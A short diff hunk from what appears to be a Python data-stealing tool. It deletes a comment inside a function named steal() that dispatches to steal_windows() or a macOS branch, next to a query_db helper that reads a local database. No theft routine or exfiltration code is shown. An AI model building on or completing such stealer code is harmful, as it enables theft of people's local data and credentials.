@@ -29,7 +29,6 @@ def query_db(db_path):
 	return cursor.fetchall()
 
 def steal():
-	# Do only if on Windows or Mac, Linux support will be added later
 	if platform.system() == "Windows":
 		return steal_windows()
 	elif platform.system()=='Darwin':
